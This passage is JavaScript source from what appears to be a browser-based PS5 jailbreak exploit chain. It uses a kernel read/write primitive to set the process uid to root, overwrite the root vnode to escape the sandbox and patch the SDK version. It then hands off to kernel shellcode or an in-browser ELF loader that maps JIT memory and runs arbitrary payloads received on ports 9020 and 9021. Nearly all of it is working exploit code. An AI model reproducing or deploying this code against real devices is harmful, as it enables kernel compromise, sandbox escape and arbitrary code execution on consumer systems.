    let proc_pdynlib_offset = krw.curprocAddr.add32(0x3e8);
    let proc_pdynlib_addr = await krw.read8(proc_pdynlib_offset);

    let restrict_flags_addr = proc_pdynlib_addr.add32(0x118);
    await krw.write4(restrict_flags_addr, 0);

    let libkernel_ref_addr = proc_pdynlib_addr.add32(0x18);
    await krw.write8(libkernel_ref_addr, new int64(1, 0));

    cur_uid = await chain.syscall(SYS_GETUID);
    await log("We root now? uid=0x" + cur_uid, LogLevel.INFO);

    let is_in_sandbox = await chain.syscall(SYS_IS_IN_SANDBOX);
    await log(
      "Jailbreaking... (in sandbox: " + is_in_sandbox + ")",
      LogLevel.INFO,
    );
    let rootvnode = await krw.read8(get_kaddr(OFFSET_KERNEL_ROOTVNODE));
    await krw.write8(krw.procFdAddr.add32(0x10), rootvnode);
    await krw.write8(krw.procFdAddr.add32(0x18), rootvnode);

    is_in_sandbox = await chain.syscall(SYS_IS_IN_SANDBOX);
    await log("We escaped now? in sandbox: " + is_in_sandbox, LogLevel.INFO);

    if (typeof OFFSET_KERNEL_PS4SDK != "undefined") {
      await krw.write4(get_kaddr(OFFSET_KERNEL_PS4SDK), 0x99999999);
      await log("Patched PS4 SDK version to 99.99", LogLevel.INFO);
    }

    // ---- kexp handoff (aio -> kexp -> elfldr) ----------------------------
    // The kexp shellcode (payloads/kexp_2026_05_25.bin) runs in kernel
    // context and hands the elfldr blob to its own loader thread, which
    // opens 127.0.0.1:9021. On 13.xx the per-fw offsets only publish
    // lk_pthread_join/lc_memset, so kexp.js resolves the other 16 symbols
    // at runtime from the in-process module images before patching. Any
    // failure or absence falls back to the in-browser JIT loader below.
    if (typeof runKexp === "function") {
      try {
        await log("KEXP: aio -> kexp -> elfldr handoff ...", LogLevel.INFO);
        const kOpt =
          typeof window.AIO_CFG === "object" && window.AIO_CFG !== null
            ? window.AIO_CFG
            : {};
        kexpElfldr = await runKexp(krw, p, chain, log, kOpt);
        if (kexpElfldr) {
          is_elfldr_running = true;
          await log(
            "KEXP: elfldr is up in the kernel, listening on 9021",
            LogLevel.INFO,
          );
        }
      } catch (e) {
        await log(
          "KEXP handoff failed: " +
            ((e && e.message) || e) +
            " - falling back to the in-browser ELF loader",
          LogLevel.ERROR,
        );
        kexpElfldr = false;
      }
    }
    if (!kexpElfldr) {
      let dlsym_addr = p.syscalls[SYS_DYNLIB_DLSYM];
      let jit_handle_store = p.malloc(0x4);

      let OFFSET_ELF_HEADER_ENTRY = 0x18;
      let OFFSET_ELF_HEADER_PHOFF = 0x20;
      let OFFSET_ELF_HEADER_PHNUM = 0x38;

      let OFFSET_PROGRAM_HEADER_TYPE = 0x00;
      let OFFSET_PROGRAM_HEADER_FLAGS = 0x04;
      let OFFSET_PROGRAM_HEADER_OFFSET = 0x08;
      let OFFSET_PROGRAM_HEADER_VADDR = 0x10;
      let OFFSET_PROGRAM_HEADER_MEMSZ = 0x28;

      let OFFSET_RELA_OFFSET = 0x00;
      let OFFSET_RELA_INFO = 0x08;
      let OFFSET_RELA_ADDEND = 0x10;

      let ELF_PT_LOAD = 0x01;
      let ELF_PT_DYNAMIC = 0x02;

      let ELF_DT_NULL = 0x00;
      let ELF_DT_RELA = 0x07;
      let ELF_DT_RELASZ = 0x08;
      let ELF_DT_RELAENT = 0x09;
      let ELF_R_AMD64_RELATIVE = 0x08;

      var conn_ret_store = p.malloc(0x8);

      let shadow_mapping_addr = new int64(0x20100000, 0x00000009);
      let mapping_addr = new int64(0x26100000, 0x00000009);

      let elf_program_headers_offset = 0;
      let elf_program_headers_num = 0;
      let elf_entry_point = 0;

      var parse_elf_store = async function (total_sz = -1) {
        elf_program_headers_offset = p.read4(
          elf_store.add32(OFFSET_ELF_HEADER_PHOFF),
        );
        elf_program_headers_num =
          p.read4(elf_store.add32(OFFSET_ELF_HEADER_PHNUM)) & 0xffff;
        elf_entry_point = p.read4(elf_store.add32(OFFSET_ELF_HEADER_ENTRY));

        if (elf_program_headers_offset != 0x40) {
          await log(
            "    ELF header malformed, terminating connection.",
            LogLevel.ERROR,
          );
          throw new Error("ELF header malformed, terminating connection.");
        }

        let text_segment_sz = 0;
        let data_segment_sz = 0;
        let rela_table_offset = 0;
        let rela_table_count = 0;
        let rela_table_size = 0;
        let rela_table_entsize = 0;

        let shadow_write_mapping = 0;

        for (let i = 0; i < elf_program_headers_num; i++) {
          let program_header_offset =
            elf_program_headers_offset + i * SIZE_ELF_PROGRAM_HEADER;

          let program_type = p.read4(
            elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_TYPE),
          );
          let program_flags = p.read4(
            elf_store.add32(
              program_header_offset + OFFSET_PROGRAM_HEADER_FLAGS,
            ),
          );
          let program_offset = p.read4(
            elf_store.add32(
              program_header_offset + OFFSET_PROGRAM_HEADER_OFFSET,
            ),
          );
          let program_vaddr = p.read4(
            elf_store.add32(
              program_header_offset + OFFSET_PROGRAM_HEADER_VADDR,
            ),
          );
          let program_memsz = p.read4(
            elf_store.add32(
              program_header_offset + OFFSET_PROGRAM_HEADER_MEMSZ,
            ),
          );
          let aligned_memsz = (program_memsz + 0x3fff) & 0xffffc000;

          if (program_type == ELF_PT_LOAD) {
            if ((program_flags & 1) == 1) {
              text_segment_sz = program_memsz;

              chain.add_syscall_ret(
                jit_handle_store,
                SYS_JITSHM_CREATE,
                0x0,
                aligned_memsz,
                0x7,
              );
              await chain.run();
              let exec_handle = p.read4(jit_handle_store);

              chain.add_syscall_ret(
                jit_handle_store,
                SYS_JITSHM_ALIAS,
                exec_handle,
                0x3,
              );
              await chain.run();
              let write_handle = p.read4(jit_handle_store);

              chain.add_syscall_ret(
                conn_ret_store,
                SYS_MMAP,
                shadow_mapping_addr,
                aligned_memsz,
                0x3,
                0x11,
                write_handle,
                0,
              );
              await chain.run();
              shadow_write_mapping = p.read8(conn_ret_store);

              let dest = p.read8(conn_ret_store);
              for (let j = 0; j < program_memsz; j += 0x8) {
                let src_qword = p.read8(elf_store.add32(program_offset + j));
                p.write8(dest.add32(j), src_qword);
              }

              await chain.add_syscall_ret(
                conn_ret_store,
                SYS_MMAP,
                mapping_addr.add32(program_vaddr),
                aligned_memsz,
                0x5,
                0x11,
                exec_handle,
                0,
              );
              await chain.run();
            } else {
              data_segment_sz = aligned_memsz;

              await chain.add_syscall_ret(
                conn_ret_store,
                SYS_MMAP,
                mapping_addr.add32(program_vaddr),
                aligned_memsz,
                0x3,
                0x1012,
                0xffffffff,
                0,
              );
              await chain.run();

              let dest = mapping_addr.add32(program_vaddr);
              for (let j = 0; j < program_memsz; j += 0x8) {
                let src_qword = p.read8(elf_store.add32(program_offset + j));
                p.write8(dest.add32(j), src_qword);
              }
            }
          }

          if (program_type == ELF_PT_DYNAMIC) {
            for (let j = 0x00; ; j += 0x10) {
              let d_tag = p.read8(elf_store.add32(program_offset + j)).low;
              let d_val = p.read8(elf_store.add32(program_offset + j + 0x08));

              if (d_tag == ELF_DT_NULL || j > 0x100) {
                break;
              }

              switch (d_tag) {
                case ELF_DT_RELA:
                  rela_table_offset = d_val.low;
                  break;
                case ELF_DT_RELASZ:
                  rela_table_size = d_val.low;
                  break;
                case ELF_DT_RELAENT:
                  rela_table_entsize = d_val.low;
                  break;
              }
            }
          }
        }

        if (rela_table_offset != 0) {
          let base_address = 0x1000;

          rela_table_offset += base_address;

          rela_table_count = rela_table_size / rela_table_entsize;

          for (let i = 0; i < rela_table_count; i++) {
            let r_offset = p.read8(
              elf_store.add32(
                rela_table_offset + i * rela_table_entsize + OFFSET_RELA_OFFSET,
              ),
            );
            let r_info = p.read8(
              elf_store.add32(
                rela_table_offset + i * rela_table_entsize + OFFSET_RELA_INFO,
              ),
            );
            let r_addend = p.read8(
              elf_store.add32(
                rela_table_offset + i * rela_table_entsize + OFFSET_RELA_ADDEND,
              ),
            );

            let reloc_addr = mapping_addr.add32(r_offset.low);

            if (r_offset.low <= text_segment_sz) {
              reloc_addr = shadow_write_mapping.add32(r_offset.low);
            }

            if ((r_info.low & 0xff) == ELF_R_AMD64_RELATIVE) {
              let reloc_value = mapping_addr.add32(r_addend.low);
              p.write8(reloc_addr, reloc_value);
            }
          }
        }
      };

      let rwpair_mem = p.malloc(0x8);
      let test_payload_store = p.malloc(0x8);
      let pthread_handle_store = p.malloc(0x8);
      let pthread_value_store = p.malloc(0x8);
      let args = p.malloc(0x8 * 6);

      var execute_elf_store = async function () {
        p.write8(rwpair_mem, 0);
        p.write8(rwpair_mem.add32(0x4), 0);
        p.write8(test_payload_store, 0);
        p.write8(pthread_handle_store, 0);
        p.write8(pthread_value_store, 0);
        for (let i = 0; i < 0x8 * 6; i++) {
          p.write1(args.add32(i), 0);
        }

        p.write4(rwpair_mem.add32(0x00), krw.masterSock);
        p.write4(rwpair_mem.add32(0x04), krw.victimSock);

        p.write8(args.add32(0x00), dlsym_addr);
        p.write8(args.add32(0x08), krw.pipeMem);
        p.write8(args.add32(0x10), rwpair_mem);
        p.write8(args.add32(0x18), krw.pipeAddr);
        p.write8(args.add32(0x20), krw.kdataBase);
        p.write8(args.add32(0x28), test_payload_store);

        await log("    Executing...", LogLevel.INFO);
        await chain.call(
          p.libKernelBase.add32(OFFSET_lk_pthread_create_name_np),
          pthread_handle_store,
          0x0,
          mapping_addr.add32(elf_entry_point),
          args,
          p.stringify("payload"),
        );
      };

      var wait_for_elf_to_exit = async function () {
        await chain.call(
          p.libKernelBase.add32(OFFSET_lk_pthread_join),
          p.read8(pthread_handle_store),
          pthread_value_store,
        );
        let res = p.read8(test_payload_store).low << 0;
        await log("    Finished, out = 0x" + res.toString(16), LogLevel.LOG);

        return res;
      };

      var load_local_elf = async function (filename) {
        try {
          let total_sz =
            await load_payload_into_elf_store_from_local_file(filename);
          await parse_elf_store(total_sz);
          await execute_elf_store();
          return await wait_for_elf_to_exit();
        } catch (error) {
          await log("    Failed to load local elf: " + error, LogLevel.ERROR);
          return -1;
        }
      };

      // The shipped ELF is elfldr-ps5-1360.elf; "elfldr-ps5.elf" does not exist in
      // payloads/, so this legacy loader path could only ever have thrown "Failed to
      // fetch the binary file. Status: 404". The exploits themselves do not come through
      // here - they use stage5 kexp handoff, which fetches
      // payloads/elfldr-ps5-1360.elf directly - so this was dead-but-broken rather than
      // fatal. Point it at the file that is actually in the zip.
      if ((await load_local_elf("elfldr-ps5-1360.elf")) == 0) {
        await log(`elfldr listening on ${ip.ip}:9021`, LogLevel.INFO);
        is_elfldr_running = true;
      } else {
        await log(
          "elfldr exited with non-zero code, port 9021 will likely not work",
          LogLevel.ERROR,
        );
        await new Promise((resolve) => setTimeout(resolve, 1000));
      }

      var elf_loader_socket_fd = (
        await chain.syscall(SYS_SOCKET, AF_INET, SOCK_STREAM, 0)
      ).low;
      if (elf_loader_socket_fd <= 0) {
        throw new Error("Failed to create ELF loader socket");
      }

      var elf_loader_sock_addr_store = p.malloc(0x10, 1);
      build_addr(p, elf_loader_sock_addr_store, AF_INET, htons(9020), 0);

      let SOL_SOCKET = 0xffff;
      let SO_REUSEADDR = 0x0004;
      let opt_buf = p.malloc(0x4, 1);
      p.write4(opt_buf, 1);

      let setsockopt_res =
        (
          await chain.syscall(
            SYS_SETSOCKOPT,
            elf_loader_socket_fd,
            SOL_SOCKET,
            SO_REUSEADDR,
            opt_buf,
            0x4,
          )
        ).low << 0;
      if (setsockopt_res < 0) {
        throw new Error("Failed to setsockopt on ELF loader socket");
      }

      let bind_res =
        (
          await chain.syscall(
            SYS_BIND,
            elf_loader_socket_fd,
            elf_loader_sock_addr_store,
            0x10,
          )
        ).low << 0;
      if (bind_res < 0) {
        throw new Error("Failed to bind ELF loader socket");
      }

      let backlog = 16;
      let listen_res =
        (await chain.syscall(SYS_LISTEN, elf_loader_socket_fd, backlog)).low <<
        0;
      if (listen_res < 0) {
        throw new Error("Failed to listen on ELF loader socket");
      }

      var conn_addr_store = p.malloc(0x10, 1);
      var conn_addr_size_store = p.malloc(0x4, 1);

      var select_readfds_size = 1024 / 8;
      var select_readfds = p.malloc(select_readfds_size, 1);

      var timeout_size = 0x10;
      var timeout = p.malloc(timeout_size);
      p.write8(timeout, 0);
      p.write8(timeout.add32(0x8), 50000);

      await log("elf loader listening on port 9020", LogLevel.INFO);
    } else {
      await log(
        "KEXP active: elfldr owns port 9021; in-browser loader skipped",
        LogLevel.INFO,
      );
    }
  }

  async function fstat(fd, stat_buf) {
    if (stat_buf.backing.byteLength < 0x78) {
      throw new Error("Stat buffer size too small");
    }

    let res = (await chain.syscall(SYS_FSTAT, fd, stat_buf)).low << 0;

    if (res < 0) {
      throw new Error("Error getting file status, res: " + res);
    }

    let st_rdev = p.read4(stat_buf.add32(20));

    let st_atim_tv_sec = p.read8(stat_buf.add32(24));
    let st_atim = new Date(
      st_atim_tv_sec.low * 1000 + st_atim_tv_sec.hi / 1000,
    );

    let st_mtim_tv_sec = p.read8(stat_buf.add32(40));
    let st_mtim = new Date(
      st_mtim_tv_sec.low * 1000 + st_mtim_tv_sec.hi / 1000,
    );

    let st_ctim_tv_sec = p.read8(stat_buf.add32(56));
    let st_ctim = new Date(
      st_ctim_tv_sec.low * 1000 + st_ctim_tv_sec.hi / 1000,
    );

    let st_size = p.read8(stat_buf.add32(72));
    if (st_size.hi !== 0) {
      throw new Error("File size too large");
    }

    let st_blksize = p.read4(stat_buf.add32(88));

    let st_flags = p.read4(stat_buf.add32(92));

    let st_birthtim_tv_sec = p.read8(stat_buf.add32(104));
    let st_birthtim = new Date(
      st_birthtim_tv_sec.low * 1000 + st_birthtim_tv_sec.hi / 1000,
    );

    return {
      st_rdev: st_rdev,
      st_atim: st_atim,
      st_mtim: st_mtim,
      st_ctim: st_ctim,
      st_size: st_size.low,
      st_blksize: st_blksize,
      fflags_t: st_flags,
      st_birthtim: st_birthtim,
    };
  }

  const DT_DIR = 4;

  async function ls(path, temp_buf) {
    if (!temp_buf.backing) {
      throw new Error("buffers backing js array not set");
    }
    let temp_buf_size = temp_buf.backing.byteLength;

    if (temp_buf_size < 0x108 || temp_buf_size < path.length + 1) {
      throw new Error("Temp buffer size too small");
    }

    if (path.endsWith("/") && path !== "/") {
      path = path.slice(0, -1);
    }

    let bufferDataView = new DataView(
      temp_buf.backing.buffer,
      temp_buf.backing.byteOffset,
      temp_buf_size,
    );

    const O_DIRECTORY = 0x00020000;

    let result = [];

    p.writestr(temp_buf, path);

    let dir_fd =
      (await chain.syscall(SYS_OPEN, temp_buf, O_DIRECTORY)).low << 0;
    if (dir_fd < 0) {
      throw new Error(
        `Error opening directory '${path}' (not found, or not a directory)`,
      );
    }

    try {
      let stat = await fstat(dir_fd, temp_buf);

      let block_size = stat.st_blksize;

      if (block_size <= 0) {
        throw new Error("Invalid block size");
      }

      if (temp_buf_size < block_size) {
        throw new Error(
          "Dirent buffer size too small, it has to be at least the fs block size which is " +
            block_size,
        );
      }

      let total_bytes_read = 0;
      let total_files = 0;

      while (true) {
        let bytes_read =
          (
            await chain.syscall(
              SYS_GETDIRENTRIES,
              dir_fd,
              temp_buf,
              temp_buf_size,
              0,
            )
          ).low << 0;

        if (bytes_read < 0) {
          throw new Error("Error reading directory");
        }

        if (bytes_read == 0) {
          break;
        }

        let offset = 0;
        let loops = 0;
        while (offset < bytes_read) {
          loops++;

          let d_fileno = bufferDataView.getUint32(offset, true);
          let d_reclen = bufferDataView.getUint16(offset + 4, true);
          let d_type = bufferDataView.getUint8(offset + 6);
          let d_namlen = bufferDataView.getUint8(offset + 7);
          let d_name = "";
          for (let i = 0; i < d_namlen; i++) {
            d_name += String.fromCharCode(
              bufferDataView.getUint8(offset + 8 + i),
            );
          }

          result.push({ d_fileno, d_reclen, d_type, d_namlen, d_name });

          offset += d_reclen;
          total_files++;
        }

        total_bytes_read += bytes_read;
      }

      return result;
    } finally {
      await chain.syscall(SYS_CLOSE, dir_fd);

      if (temp_buf.backing) {
        temp_buf.backing.fill(0);
      }
    }
  }

  async function delete_appcache(log = () => {}) {
    let user_home_entries = await ls("/user/home", elf_store);

    let user_ids = user_home_entries.reduce((acc, dirent) => {
      if (
        dirent.d_type === DT_DIR &&
        dirent.d_name !== "." &&
        dirent.d_name !== ".."
      ) {
        let user_id = dirent.d_name;
        acc.push(user_id);
      }
      return acc;
    }, []);

    if (user_ids.length === 0) {
      throw new Error("No users found");
    }

    async function unlink(path) {
      p.writestr(elf_store, path);
      return await chain.syscall_int32(SYS_UNLINK, elf_store);
    }

    for (let user_id of user_ids) {
      await unlink(
        `/user/home/${user_id}/webkit/shell/appcache/ApplicationCache.db`,
      );
      await unlink(
        `/user/home/${user_id}/webkit/shell/appcache/ApplicationCache.db-shm`,
      );
      await unlink(
        `/user/home/${user_id}/webkit/shell/appcache/ApplicationCache.db-wal`,
      );
      await log(`Deleted appcache files for user with id '${user_id}'`);
    }

    if (user_ids.length > 1) {
      await log(`Deleted appcache files for all ${user_ids.length} users`);
    }
  }

  async function send_buffer_to_port(buffer, size, port) {
    let sock =
      (await chain.syscall(SYS_SOCKET, AF_INET, SOCK_STREAM, 0)).low << 0;
    if (sock <= 0) {
      throw new Error("Failed to create socket");
    }

    build_addr(
      p,
      send_buffer_to_port.sock_addr_store,
      AF_INET,
      htons(port),
      0x0100007f,
    );

    let connect_res =
      (
        await chain.syscall(
          SYS_CONNECT,
          sock,
          send_buffer_to_port.sock_addr_store,
          0x10,
        )
      ).low << 0;
    if (connect_res < 0) {
      await chain.syscall(SYS_CLOSE, sock);
      throw new Error("Failed to connect to port " + port);
    }

    let bytes_sent = 0;
    let write_ptr = buffer.add32(0x0);
    while (bytes_sent < size) {
      let send_res =
        (await chain.syscall(SYS_WRITE, sock, write_ptr, size - bytes_sent))
          .low << 0;
      if (send_res <= 0) {
        await chain.syscall(SYS_CLOSE, sock);
        throw new Error("Failed to send buffer to port " + port);
      }

      bytes_sent += send_res;
      write_ptr.add32inplace(send_res);
    }

    await chain.syscall(SYS_CLOSE, sock);
  }
  send_buffer_to_port.sock_addr_store = p.malloc(0x10, 1);

  sessionStorage.removeItem(SESSIONSTORE_ON_LOAD_AUTORUN_KEY);

  let ports = wkOnly || kexpElfldr ? "" : "9020";
  if (is_elfldr_running) {
    if (ports) {
      ports += ", ";
    }
    ports += "9021";
  }

  document.getElementById("top-bar-text").innerHTML =
    `Listening on: <span class="fw-bold">${ip.ip}</span> (port: ${ports}) (${ip.name})`;

  let queue = [];

  window.addEventListener(
    MAINLOOP_EXECUTE_PAYLOAD_REQUEST,
    async function (event) {
      let payload_info = event.detail;
      let toast = showToast(
        `${payload_info.displayTitle}: Waiting in queue...`,
        -1,
      );
      queue.push({ payload_info, toast });
    },
  );

  await new Promise((resolve) => setTimeout(resolve, 300));
  await switchPage("payloads-view");

  while (true) {
    if (queue.length > 0) {
      let { payload_info, toast } = queue.shift();

      try {
        if (payload_info.customAction) {
          if (payload_info.customAction === CUSTOM_ACTION_APPCACHE_REMOVE) {
            await delete_appcache(updateToastMessage.bind(null, toast));
          } else {
            throw new Error(
              `Unknown custom action: ${payload_info.customAction}`,
            );
          }
        } else {
          updateToastMessage(
            toast,
            `${payload_info.displayTitle}: Fetching...`,
          );
          let total_sz = await load_payload_into_elf_store_from_local_file(
            payload_info.fileName,
          );

          if (!payload_info.toPort) {
            if (kexpElfldr) {
              // kexp mode: elfldr in the kernel owns the port; hand
              // the raw file over the loopback to 9021.
              updateToastMessage(
                toast,
                `${payload_info.displayTitle}: Sending to port 9021 (elfldr)...`,
              );
              await send_buffer_to_port(elf_store, total_sz, 9021);
              updateToastMessage(
                toast,
                `${payload_info.displayTitle}: Sent to port 9021`,
              );
            } else if (wkOnly) {
              throw new Error();
            } else {
              updateToastMessage(
                toast,
                `${payload_info.displayTitle}: Parsing...`,
              );
              await parse_elf_store(total_sz);
              updateToastMessage(
                toast,
                `${payload_info.displayTitle}: Payload running...`,
              );
              await execute_elf_store();
              let out = await wait_for_elf_to_exit();

              if (out !== 0) {
                throw new Error(
                  "Payload exited with non-zero code: 0x" + out.toString(16),
                );
              }

              updateToastMessage(
                toast,
                `${payload_info.displayTitle}: Payload exited with success code`,
              );
            }
          } else {
            updateToastMessage(
              toast,
              `${payload_info.displayTitle}: Sending to port ${payload_info.toPort}...`,
            );
            await send_buffer_to_port(elf_store, total_sz, payload_info.toPort);
            updateToastMessage(
              toast,
              `${payload_info.displayTitle}: Sent to port ${payload_info.toPort}`,
            );
          }
        }
      } catch (error) {
        updateToastMessage(
          toast,
          `${payload_info.displayTitle}: Error: ${error}`,
        );
        setTimeout(removeToast, TOAST_ERROR_TIMEOUT, toast);
        continue;
      }

      setTimeout(removeToast, TOAST_SUCCESS_TIMEOUT, toast);
    }

    if (queue.length > 0) {
      continue;
    }

    if (wkOnly || kexpElfldr) {
      await new Promise((resolve) => setTimeout(resolve, 50));
      continue;
    }

    select_readfds.backing.fill(0);
    select_readfds.backing[elf_loader_socket_fd >> 3] |=
      1 << (elf_loader_socket_fd & 7);
    let select_res =
      (
        await chain.syscall(
          SYS_SELECT,
          elf_loader_socket_fd + 1,
          select_readfds,
          0,
          0,
          timeout,
        )
      ).low << 0;
    if (select_res < 0) {
      throw new Error("Select failed");
    } else if (select_res === 0) {
      continue;
    }

    let conn_fd =
      (
        await chain.syscall(
          SYS_ACCEPT,
          elf_loader_socket_fd,
          conn_addr_store,
          conn_addr_size_store,
        )
      ).low << 0;
    if (conn_fd < 0) {
      throw new Error("Failed to accept connection");
    }

    let toast = showToast("ELF Loader: Got a connection, reading...", -1);
    try {
      let write_ptr = elf_store.add32(0x0);
      let total_sz = 0;
      while (total_sz < elf_store_size) {
        let read_res =
          (
            await chain.syscall(
              SYS_READ,
              conn_fd,
              write_ptr,
              elf_store_size - total_sz,
            )
          ).low << 0;
        if (read_res <= 0) {
          break;
        }

        write_ptr.add32inplace(read_res);
        total_sz += read_res;
      }

      updateToastMessage(toast, "ELF Loader: Parsing ELF...");
      await parse_elf_store(total_sz);

      updateToastMessage(toast, "ELF Loader: Executing ELF...");
      await execute_elf_store();

      let out = await wait_for_elf_to_exit();
      if (out !== 0) {
        throw new Error(
          "ELF Loader exited with non-zero code: 0x" + out.toString(16),
        );
      }

      updateToastMessage(toast, "ELF Loader: Payload exited with success code");
      setTimeout(removeToast, TOAST_SUCCESS_TIMEOUT, toast);
    } catch (error) {
      updateToastMessage(toast, `ELF Loader: Error: ${error}`);
      setTimeout(removeToast, TOAST_ERROR_TIMEOUT, toast);
    } finally {
      await chain.syscall(SYS_CLOSE, conn_fd);
    }
  }
}

let fwScript = document.createElement("script");
document.body.appendChild(fwScript);

fwScript.setAttribute("src", `offsets/${window.fw_str}.js?v=` + Date.now());
